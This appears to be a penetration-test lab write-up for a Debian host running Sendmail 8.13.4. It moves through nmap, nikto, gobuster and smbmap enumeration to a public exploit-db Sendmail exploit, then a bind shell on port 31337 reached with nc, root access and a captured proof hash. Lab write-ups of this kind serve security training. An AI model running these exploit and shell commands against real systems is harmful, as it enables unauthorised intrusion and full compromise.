# IP: 192.168.132.42

# Enumeration
## Nmap
### Inital Scan
Command
```
nmap -A -vv -oA enum/nmap-initial 192.168.132.42
```

Output
```
PORT    STATE SERVICE     REASON  VERSION                                                                                                                                                                                                    
22/tcp  open  ssh         syn-ack OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)                                                                                                                                                            
| ssh-hostkey:                                                                                                                                                                                                                               
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)                                                                                                                                                                               
| ssh-dss AAAAB3NzaC1kc3MAAACBALr/RyBq802QXa1Bh4SQEUHqD+p9TEx3SUvPHACbT0tQqR3aali+ifDiOpqMToVaRfWzYOOsoM2Neg0EPa4KsJIwSTkFqjd/3Ynp3Yzus0nN+gtmbQRKzo8QfStr6IGt6kaI6viXl4z3ww6ryEkjNnb74KCooHOjyeGPi3o89GVnAAAAFQDSg0dwMrSn9juW/XPvo8S8kVOhDQA
AAIARaqFuvZCqiTY8i/PITsr5WvyZm8mQ0nuqB6gW6y1h4jDAvtHO4TIZEMJ5vtPst0w9mVSYGVFlukhCqhbJdBigqH1WB1p7kwC78M9k23zZmzuwbnzYPiLHpEdfFEWdO62ZoCSFBXWOqe1IZaTaRCgUZPeB1QFXRCQ96VrJizPLUAAAAIEArOALxR78fZrUqmUcYOs5tf8wu5xChAUqAfh1ElJ6r3EjcWwXId12jo1u
Az0JmCTluUQhjhNDJB6XIgUzoFzW1NZPjGCkex7s1+2+TUTmqFr6Nr97k2RIy91Bpuxwg5jzE83cKPCOoWVbYlfzAqNkF4xxznfC3fRtmj2e/L9chzg=                                                                                                                         
|   1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)                                                                                                                                                                               
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAviGcDkDxKzv7w++DXy6q+5AJDpG/q8Um8j4BheW9fgwsOvQCuDvLcPUIKMYEz4aUgkt/sSCXu29XTlu79pEkb48+BnaRCKrHLH/YWM79GT6Q5ie9jP47HjjJeCCBI/c02qpkH/fjz9FK4HQPC7WtXY9EgW4IMB+pzX2KZxK2PF0=                           
25/tcp  open  smtp        syn-ack Sendmail 8.13.4/8.13.4/Debian-3sarge3                                                                                                                                                                      
| smtp-commands: localhost.localdomain Hello [192.168.49.132], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP,                                                                 
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the impleme
ntation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info                                                                                            
80/tcp  open  http        syn-ack Apache httpd 1.3.33 ((Debian GNU/Linux))                                                                                                                                                                   
| http-methods:                                                                                                                                                                                                                              
|   Supported Methods: GET HEAD OPTIONS TRACE                                                                                                                                                                                                
|_  Potentially risky methods: TRACE                                                                                                                                                                                                         
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)                                                                                                                                                                                       
|_http-title: Ph33r                                                                                                                                                                                                                          
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp open  smux        syn-ack Linux SNMP multiplexer
445/tcp open  netbios-ssn syn-ack Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: 5h59m58s, deviation: 2h49m42s, median: 3h59m58s
| nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   0XBABE<00>           Flags: <unique><active>
|   0XBABE<03>           Flags: <unique><active>
|   0XBABE<20>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38414/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 19117/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 28456/udp): CLEAN (Failed to receive data)
|   Check 4 (port 39399/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-24T00:40:12-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
```

### Full Scan
Command
```
nmap -A -vv -p- -oA enum/nmap-full 192.168.132.42
```

Output
```
PORT      STATE SERVICE     REASON  VERSION                                                                                                                                                                                                  
22/tcp    open  ssh         syn-ack OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)                                                                                                                                                          
| ssh-hostkey:                                                                                                                                                                                                                               
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)                                                                                                                                                                               
| ssh-dss AAAAB3NzaC1kc3MAAACBALr/RyBq802QXa1Bh4SQEUHqD+p9TEx3SUvPHACbT0tQqR3aali+ifDiOpqMToVaRfWzYOOsoM2Neg0EPa4KsJIwSTkFqjd/3Ynp3Yzus0nN+gtmbQRKzo8QfStr6IGt6kaI6viXl4z3ww6ryEkjNnb74KCooHOjyeGPi3o89GVnAAAAFQDSg0dwMrSn9juW/XPvo8S8kVOhDQA
AAIARaqFuvZCqiTY8i/PITsr5WvyZm8mQ0nuqB6gW6y1h4jDAvtHO4TIZEMJ5vtPst0w9mVSYGVFlukhCqhbJdBigqH1WB1p7kwC78M9k23zZmzuwbnzYPiLHpEdfFEWdO62ZoCSFBXWOqe1IZaTaRCgUZPeB1QFXRCQ96VrJizPLUAAAAIEArOALxR78fZrUqmUcYOs5tf8wu5xChAUqAfh1ElJ6r3EjcWwXId12jo1u
Az0JmCTluUQhjhNDJB6XIgUzoFzW1NZPjGCkex7s1+2+TUTmqFr6Nr97k2RIy91Bpuxwg5jzE83cKPCOoWVbYlfzAqNkF4xxznfC3fRtmj2e/L9chzg=                                                                                                                         
|   1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)                                                                                                                                                                               
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAviGcDkDxKzv7w++DXy6q+5AJDpG/q8Um8j4BheW9fgwsOvQCuDvLcPUIKMYEz4aUgkt/sSCXu29XTlu79pEkb48+BnaRCKrHLH/YWM79GT6Q5ie9jP47HjjJeCCBI/c02qpkH/fjz9FK4HQPC7WtXY9EgW4IMB+pzX2KZxK2PF0=                           
25/tcp    open  smtp        syn-ack Sendmail 8.13.4/8.13.4/Debian-3sarge3                                                                                                                                                                    
| smtp-commands: localhost.localdomain Hello [192.168.49.132], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP,                                                                 
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the impleme
ntation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info                                                                                            
80/tcp    open  http        syn-ack Apache httpd 1.3.33 ((Debian GNU/Linux))                                                                                                                                                                 
| http-methods:                                                                                                                                                                                                                              
|   Supported Methods: GET HEAD OPTIONS TRACE                                                                                                                                                                                                
|_  Potentially risky methods: TRACE                                                                                                                                                                                                         
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)                                                                                                                                                                                       
|_http-title: Ph33r                                                                                                                                                                                                                          
139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                                                                                              
199/tcp   open  smux        syn-ack Linux SNMP multiplexer                                                                                                                                                                                   
445/tcp   open  netbios-ssn syn-ack Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)                                                                                                                                                         
60000/tcp open  ssh         syn-ack OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)                                                                                                                                                          
| ssh-hostkey:                                                                                                                                                                                                                               
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)                                                                                                                                                                               
| ssh-dss AAAAB3NzaC1kc3MAAACBALr/RyBq802QXa1Bh4SQEUHqD+p9TEx3SUvPHACbT0tQqR3aali+ifDiOpqMToVaRfWzYOOsoM2Neg0EPa4KsJIwSTkFqjd/3Ynp3Yzus0nN+gtmbQRKzo8QfStr6IGt6kaI6viXl4z3ww6ryEkjNnb74KCooHOjyeGPi3o89GVnAAAAFQDSg0dwMrSn9juW/XPvo8S8kVOhDQA
AAIARaqFuvZCqiTY8i/PITsr5WvyZm8mQ0nuqB6gW6y1h4jDAvtHO4TIZEMJ5vtPst0w9mVSYGVFlukhCqhbJdBigqH1WB1p7kwC78M9k23zZmzuwbnzYPiLHpEdfFEWdO62ZoCSFBXWOqe1IZaTaRCgUZPeB1QFXRCQ96VrJizPLUAAAAIEArOALxR78fZrUqmUcYOs5tf8wu5xChAUqAfh1ElJ6r3EjcWwXId12jo1u
Az0JmCTluUQhjhNDJB6XIgUzoFzW1NZPjGCkex7s1+2+TUTmqFr6Nr97k2RIy91Bpuxwg5jzE83cKPCOoWVbYlfzAqNkF4xxznfC3fRtmj2e/L9chzg=                                                                                                                         
|   1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)                                                                                                                                                                               
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAviGcDkDxKzv7w++DXy6q+5AJDpG/q8Um8j4BheW9fgwsOvQCuDvLcPUIKMYEz4aUgkt/sSCXu29XTlu79pEkb48+BnaRCKrHLH/YWM79GT6Q5ie9jP47HjjJeCCBI/c02qpkH/fjz9FK4HQPC7WtXY9EgW4IMB+pzX2KZxK2PF0=
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 5h59m58s, deviation: 2h49m42s, median: 3h59m58s
| nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   0XBABE<00>           Flags: <unique><active>
|   0XBABE<03>           Flags: <unique><active>
|   0XBABE<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38414/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 19117/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 28456/udp): CLEAN (Failed to receive data)
|   Check 4 (port 39399/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-24T00:46:25-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
```

## Port 80
![](../Attachments/Pasted%20image%2020210923194340.png)

Converted Binary

![](../Attachments/Pasted%20image%2020210923194500.png)
```
ifyoudontpwnmeuran00b
```

### Nikto
Command
```
nikto -h http://192.168.132.42 -o enum/nikto.txt
```

Output
```
---------------------------------------------------------------------------
+ Server: Apache/1.3.33 (Debian GNU/Linux)
+ Server may leak inodes via ETags, header found with file /, inode: 418030, size: 289, mtime: Wed Jan 21 19:57:56 2009
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/1.3.33 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ 8724 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-09-23 19:51:51 (GMT-5) (306 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

### GoBuster
Command
```
gobuster dir -u http://192.168.132.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o enum/gobuster.txt
```

Output
```
===============================================================
2021/09/23 19:47:07 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 289]
/doc                  (Status: 403) [Size: 272]
                                               
===============================================================
2021/09/23 19:58:50 Finished
===============================================================

```

## SMB 193/445

Command
```
smbmap -H 192.168.132.42
```
![](../Attachments/Pasted%20image%2020210923195303.png)

---

# Vulnerabilities
Script for Sendmail vulnerability
https://www.exploit-db.com/exploits/4761

Command
```
perl 4761.pl 192.168.132.42
```
![](../Attachments/Pasted%20image%2020210924162137.png)

Script opens Port 31337 for a bind shell.

NC command
```
nc 192.168.132.42 31337
```

Used Perl to get pty shell.

Command
```
perl -e 'system("bash -i");
```
![](../Attachments/Pasted%20image%2020210924162615.png)

Root Access


---

# Loot
## Root/Admin
>daee55e4ca419823614289227650aa91

Command
```
ifconfig;id;hostname;cat proof.txt
```
![](../Attachments/Pasted%20image%2020210924162935.png)